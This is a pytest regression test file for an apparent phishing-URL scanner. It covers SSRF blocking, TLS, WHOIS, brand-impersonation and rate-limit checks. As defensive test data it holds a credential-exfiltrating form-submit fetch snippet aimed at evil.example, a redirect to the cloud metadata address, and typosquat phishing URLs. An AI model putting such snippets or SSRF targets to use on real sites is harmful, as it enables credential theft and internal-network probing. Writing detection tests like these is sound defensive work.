"""
tests/test_regressions.py
Regression tests for bugs found during the project audit.
All tests run offline: network-touching helpers are monkeypatched.
"""
import io
import ssl
from datetime import datetime, timedelta, timezone

import pytest
from httpx import AsyncClient, ASGITransport
from starlette.applications import Starlette
from starlette.responses import PlainTextResponse
from starlette.routing import Route

from app.services import scan_orchestrator
from static_analysis.url_normalizer import normalize_url


FAKE_STATIC = {
    "url": "",
    "protocol_check": {"uses_https": False},
    "lexical_analysis": {"ip_based_url": True, "contains_at_symbol": True},
    "html_analysis": {"html_fetched": True},
    "tls_analysis": {"https_supported": True, "certificate_valid": True},
    "whois_analysis": {"whois_found": True},
    "brand_analysis": {},
}


@pytest.fixture
def offline_static(monkeypatch):
    calls = []

    def fake_static(url):
        calls.append(url)
        return dict(FAKE_STATIC, url=url)

    monkeypatch.setattr(scan_orchestrator, "run_static_analysis", fake_static)
    return calls


# ── URL validation ────────────────────────────────────────────────────────

class TestScanUrlValidation:
    async def test_public_ip_url_is_scored_not_rejected(self, offline_static):
        result = await scan_orchestrator.scan_url("http://8.8.8.8/login")
        assert offline_static, "static analysis never ran for an IP URL"
        assert "Invalid domain" not in result["executive_summary"]
        assert result["risk_score"] > 0

    async def test_userinfo_url_is_scored_not_rejected(self, offline_static, monkeypatch):
        monkeypatch.setattr(scan_orchestrator, "is_private_ip", lambda url: False)
        result = await scan_orchestrator.scan_url("https://paypal.com@evil.example.com/")
        assert offline_static, "static analysis never ran for an @-userinfo URL"
        assert "Invalid domain" not in result["executive_summary"]

    async def test_url_with_port_is_scored_not_rejected(self, offline_static, monkeypatch):
        monkeypatch.setattr(scan_orchestrator, "is_private_ip", lambda url: False)
        await scan_orchestrator.scan_url("https://example.com:8443/")
        assert offline_static

    async def test_garbage_domain_still_rejected(self, offline_static):
        result = await scan_orchestrator.scan_url("https://not_a_domain/")
        assert not offline_static
        assert "Invalid domain" in result["executive_summary"]

    @pytest.mark.parametrize("url", [
        "http://127.0.0.1/",
        "http://10.0.0.5/",
        "http://169.254.169.254/latest/meta-data/",
        "http://0.0.0.0:8000/",
        "http://[::1]/",
    ])
    async def test_non_public_ip_is_blocked(self, offline_static, url):
        result = await scan_orchestrator.scan_url(url)
        assert not offline_static, f"static analysis ran against {url}"
        assert "cannot be scanned" in result["executive_summary"]


class TestLexical:
    def test_ip_url_is_not_multiple_subdomains(self):
        from static_analysis.lexical_analyzer import lexical_analysis

        result = lexical_analysis("http://8.8.8.8/login")
        assert result["ip_based_url"] is True
        assert result["multiple_subdomains"] is False

    def test_deep_subdomains_still_flagged(self):
        from static_analysis.lexical_analyzer import lexical_analysis

        assert lexical_analysis("https://login.secure.verify.example.com")["multiple_subdomains"] is True


class TestNormalizeUrl:
    def test_lowercases_scheme_and_host_only(self):
        assert normalize_url("HTTPS://Example.COM/Path/AbC?Q=1") == "https://example.com/Path/AbC?Q=1"

    def test_adds_scheme(self):
        assert normalize_url("Example.com/X") == "https://example.com/X"


# ── SSRF guards on the other entry points ──────────────────────────────────

class TestSsrfGuards:
    async def test_dynamic_scan_refuses_private_target(self, monkeypatch):
        called = []

        async def fake_dynamic(url, static_results=None):
            called.append(url)
            return {}

        monkeypatch.setattr(scan_orchestrator, "run_dynamic_analysis", fake_dynamic)
        result = await scan_orchestrator.run_dynamic_scan("http://127.0.0.1:8000/")
        assert not called, "sandbox browser was pointed at a loopback address"
        assert "error" in result

    async def test_scan_image_skips_private_urls(self, monkeypatch):
        from app.api import routes
        from app.main import app

        scanned = []
        monkeypatch.setattr(
            routes, "extract_text_from_image",
            lambda path: "see http://127.0.0.1/admin and https://example.com/a",
        )
        monkeypatch.setattr(
            routes, "is_private_ip", lambda url: "127.0.0.1" in url,
        )

        def fake_static(url):
            scanned.append(url)
            return dict(FAKE_STATIC, url=url)

        monkeypatch.setattr(routes, "run_static_analysis", fake_static)

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/scan-image", files={"file": ("x.png", io.BytesIO(b"fake"), "image/png")}
            )

        assert response.status_code == 200
        assert scanned == ["https://example.com/a"]
        urls = {item["url"]: item for item in response.json()["detected_urls"]}
        assert urls["http://127.0.0.1/admin"]["preview_severity"] == "Blocked"


# ── TLS checker ────────────────────────────────────────────────────────────

class _DummySock:
    def __enter__(self):
        return self

    def __exit__(self, *exc):
        return False


def _tls_failing_with(monkeypatch, verify_code):
    from static_analysis import tls_checker

    err = ssl.SSLCertVerificationError("certificate verify failed")
    err.verify_code = verify_code

    class FailingContext:
        def wrap_socket(self, sock, server_hostname=None):
            raise err

    monkeypatch.setattr(tls_checker.socket, "create_connection", lambda *a, **k: _DummySock())
    monkeypatch.setattr(tls_checker.ssl, "create_default_context", lambda: FailingContext())
    return tls_checker.check_tls_certificate("example.com")


class TestTlsChecker:
    def test_self_signed_is_flagged(self, monkeypatch):
        result = _tls_failing_with(monkeypatch, 18)  # X509_V_ERR_DEPTH_ZERO_SELF_SIGNED_CERT
        assert result["self_signed_cert"] is True
        assert result["certificate_valid"] is False

    def test_hostname_mismatch_is_flagged(self, monkeypatch):
        result = _tls_failing_with(monkeypatch, 62)  # X509_V_ERR_HOSTNAME_MISMATCH
        assert result["domain_mismatch"] is True
        assert result["certificate_valid"] is False


# ── WHOIS ──────────────────────────────────────────────────────────────────

class TestWhois:
    def test_timezone_aware_creation_date(self, monkeypatch):
        from static_analysis import whois_checker

        class Record:
            registrar = "Example Registrar"
            creation_date = datetime.now(timezone.utc) - timedelta(days=5)

        monkeypatch.setattr(whois_checker.whois, "whois", lambda domain: Record())
        result = whois_checker.whois_check("example.com")
        assert result["domain_age_days"] == 5
        assert result["new_domain"] is True


# ── Explanation mapping ────────────────────────────────────────────────────

class TestExplanation:
    def test_tls_mismatch_gets_mismatch_paragraph(self):
        from scoring_engine.explanation import generate_explanation

        out = generate_explanation({}, {"reasons": ["TLS certificate domain mismatch"], "severity": "Medium"})
        assert "does not match" in out["detailed_analysis"][0]["report_paragraph"]


# ── Dynamic JS aggregation ─────────────────────────────────────────────────

class TestJsAggregation:
    def test_clean_page_without_password_field_is_not_flagged(self):
        from app.dynamic_analysis.sandbox_runner import aggregate_js_findings

        result = aggregate_js_findings([], {"credential_fields_detected": False}, False)
        assert result["medium_risk"] == []
        assert result["summary"] == "No suspicious script patterns detected."

    def test_credential_js_without_password_field_is_medium(self):
        from app.dynamic_analysis.sandbox_runner import aggregate_js_findings

        js = 'document.addEventListener("submit", e => fetch("https://evil.example/c"))'
        result = aggregate_js_findings([js], {"credential_fields_detected": False}, True)
        assert result["credential_related"] == []
        assert "credential_like_script_behavior" in result["medium_risk"]


# ── Rate limiter ───────────────────────────────────────────────────────────

class TestRateLimiter:
    async def test_only_post_requests_count_toward_limit(self):
        from app.core.middleware import RateLimitMiddleware

        async def ok(request):
            return PlainTextResponse("ok")

        inner = Starlette(routes=[Route("/", ok, methods=["GET", "POST"])])
        limited = RateLimitMiddleware(inner, requests_per_minute=2)

        async with AsyncClient(transport=ASGITransport(app=limited), base_url="http://test") as client:
            for _ in range(5):
                assert (await client.get("/")).status_code == 200
            assert (await client.post("/")).status_code == 200
            assert (await client.post("/")).status_code == 200
            assert (await client.post("/")).status_code == 429

    async def test_spoofed_forwarded_for_does_not_bypass_limit(self):
        from app.core.middleware import RateLimitMiddleware

        async def ok(request):
            return PlainTextResponse("ok")

        inner = Starlette(routes=[Route("/", ok, methods=["POST"])])
        limited = RateLimitMiddleware(inner, requests_per_minute=2)

        async with AsyncClient(transport=ASGITransport(app=limited), base_url="http://test") as client:
            codes = [
                (await client.post("/", headers={"X-Forwarded-For": f"203.0.113.{i}"})).status_code
                for i in range(3)
            ]
        assert codes == [200, 200, 429]

    async def test_forwarded_for_honoured_when_proxy_trusted(self):
        from app.core.middleware import RateLimitMiddleware

        async def ok(request):
            return PlainTextResponse("ok")

        inner = Starlette(routes=[Route("/", ok, methods=["POST"])])
        limited = RateLimitMiddleware(inner, requests_per_minute=1, trust_proxy_headers=True)

        async with AsyncClient(transport=ASGITransport(app=limited), base_url="http://test") as client:
            a = await client.post("/", headers={"X-Forwarded-For": "203.0.113.1"})
            b = await client.post("/", headers={"X-Forwarded-For": "203.0.113.2"})
            c = await client.post("/", headers={"X-Forwarded-For": "203.0.113.1"})
        assert (a.status_code, b.status_code, c.status_code) == (200, 200, 429)


# ── Audit 2026-11-12: redirect SSRF, cert fallback, transport signals ─────

class _FakeResponse:
    def __init__(self, status=200, location=None, text="", url=""):
        self.status_code = status
        self.headers = {"Location": location} if location else {}
        self.text = text
        self.url = url
        self.is_redirect = location is not None and status in (301, 302, 303, 307, 308)


class TestHtmlScanRedirects:
    def test_redirect_to_private_address_is_not_followed(self, monkeypatch):
        from static_analysis import html_scanner

        fetched = []

        def fake_get(url, **kwargs):
            fetched.append(url)
            if url == "https://evil.example/":
                return _FakeResponse(302, "http://169.254.169.254/latest/meta-data/")
            return _FakeResponse(200, text="<html>secret</html>", url=url)

        monkeypatch.setattr(html_scanner.requests, "get", fake_get)
        monkeypatch.setattr(html_scanner, "is_private_ip", lambda url: "169.254." in url)

        result = html_scanner.html_scan("https://evil.example/")
        assert fetched == ["https://evil.example/"], "followed a redirect into a private address"
        assert result["html_fetched"] is False
        assert result["blocked_redirect"] is True

    def test_public_redirect_is_followed_and_final_domain_used(self, monkeypatch):
        from static_analysis import html_scanner

        page = '<form action="https://www.example.com/login"><input type="password"></form>'

        def fake_get(url, **kwargs):
            if url == "https://example.com/":
                return _FakeResponse(301, "https://www.example.com/")
            return _FakeResponse(200, text=page, url=url)

        monkeypatch.setattr(html_scanner.requests, "get", fake_get)
        monkeypatch.setattr(html_scanner, "is_private_ip", lambda url: False)

        result = html_scanner.html_scan("https://example.com/")
        assert result["html_fetched"] is True
        assert result["has_password_input"] is True
        assert result["external_form_action"] is False

    def test_form_posting_to_other_registered_domain_is_external(self, monkeypatch):
        from static_analysis import html_scanner

        page = '<form action="https://collector.evil.example/c"><input type="password"></form>'
        monkeypatch.setattr(html_scanner.requests, "get",
                            lambda url, **kw: _FakeResponse(200, text=page, url=url))
        monkeypatch.setattr(html_scanner, "is_private_ip", lambda url: False)

        assert html_scanner.html_scan("https://login.example.com/")["external_form_action"] is True

    def test_bad_certificate_still_gets_html_analysis(self, monkeypatch):
        import requests as real_requests
        from static_analysis import html_scanner

        calls = []

        def fake_get(url, **kwargs):
            calls.append(kwargs.get("verify", True))
            if kwargs.get("verify", True):
                raise real_requests.exceptions.SSLError("certificate verify failed")
            return _FakeResponse(200, text='<form><input type="password"></form>', url=url)

        monkeypatch.setattr(html_scanner.requests, "get", fake_get)
        monkeypatch.setattr(html_scanner, "is_private_ip", lambda url: False)

        result = html_scanner.html_scan("https://self-signed.example/")
        assert calls == [True, False]
        assert result["html_fetched"] is True
        assert result["has_password_input"] is True


class TestSchemeCase:
    def test_uppercase_scheme_is_not_double_prefixed(self):
        from app.api.schemas import ScanRequest

        assert ScanRequest(url="HTTPS://Example.com/Path").url == "https://Example.com/Path"
        assert ScanRequest(url="Http://x.example").url == "http://x.example"
        assert ScanRequest(url="example.com").url == "https://example.com"


class TestTransportSignals:
    def test_dns_failure_is_structured(self, monkeypatch):
        import socket
        from static_analysis import tls_checker

        def boom(*a, **k):
            raise socket.gaierror(-2, "Name or service not known")

        monkeypatch.setattr(tls_checker.socket, "create_connection", boom)
        result = tls_checker.check_tls_certificate("nope.invalid")
        assert result["dns_failed"] is True
        assert result["timed_out"] is False

    def test_timeout_is_structured(self, monkeypatch):
        from static_analysis import tls_checker

        def slow(*a, **k):
            raise TimeoutError("timed out")

        monkeypatch.setattr(tls_checker.socket, "create_connection", slow)
        result = tls_checker.check_tls_certificate("slow.example")
        assert result["timed_out"] is True
        assert result["dns_failed"] is False

    def test_dns_failure_reason_is_scored_and_explained(self):
        from scoring_engine.score_calculator import calculate_risk_score
        from scoring_engine.explanation import generate_explanation

        static = {
            "tls_analysis": {"https_supported": False, "certificate_valid": False, "dns_failed": True},
            "html_analysis": {"html_fetched": False},
            "whois_analysis": {"whois_found": False},
        }
        score = calculate_risk_score(static)
        assert "Domain unreachable or DNS resolution failed" in score["reasons"]
        explained = generate_explanation(static, score)
        indicators = [d["indicator"] for d in explained["detailed_analysis"]]
        assert "Domain unreachable or DNS resolution failed" in indicators


class TestWhoisEmptyRecord:
    def test_all_none_record_is_not_found(self, monkeypatch):
        from static_analysis import whois_checker

        class Empty:
            registrar = None
            creation_date = None
            domain_name = None

        monkeypatch.setattr(whois_checker.whois, "whois", lambda domain: Empty())
        assert whois_checker.whois_check("example.com")["whois_found"] is False


class TestBrandDetection:
    @pytest.mark.parametrize("url", [
        "https://login.paypa1.com/",
        "https://paypal.evil.com/",
        "https://user@paypa1.com/",
        "https://secure-paypal.account-verify.co.uk/",
    ])
    def test_impersonation_is_flagged(self, url):
        from static_analysis.brand_detector import brand_check
        assert brand_check(url)["possible_impersonation"] is True, url

    @pytest.mark.parametrize("url", [
        "https://www.paypal.com/",
        "https://paypal.com/x",
        "https://example.com/",
        "https://my-bucket.s3.amazonaws.com/index.html",
        "https://ec2-1-2-3-4.compute-1.amazonaws.com/",
    ])
    def test_legitimate_is_not_flagged(self, url):
        from static_analysis.brand_detector import brand_check
        assert brand_check(url)["possible_impersonation"] is False, url


class TestScanImageHardening:
    async def test_non_image_upload_is_400_not_500(self):
        from app.main import app

        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/scan-image", files={"file": ("x.png", io.BytesIO(b"not an image"), "image/png")}
            )
        assert response.status_code == 400
        assert "error" in response.json()

    async def test_url_count_is_capped_and_ordered(self, monkeypatch):
        from app.api import routes
        from app.main import app

        text = " ".join(f"https://site{i}.example/." for i in range(8))
        monkeypatch.setattr(routes, "extract_text_from_image", lambda path: text)
        monkeypatch.setattr(routes, "is_private_ip", lambda url: False)
        scanned = []

        def fake_static(url):
            scanned.append(url)
            return dict(FAKE_STATIC, url=url)

        monkeypatch.setattr(routes, "run_static_analysis", fake_static)
        async with AsyncClient(transport=ASGITransport(app=app), base_url="http://test") as client:
            response = await client.post(
                "/scan-image", files={"file": ("x.png", io.BytesIO(b"fake"), "image/png")}
            )
        assert response.status_code == 200
        assert scanned == [f"https://site{i}.example/" for i in range(5)]
        assert response.json()["urls_truncated"] is True
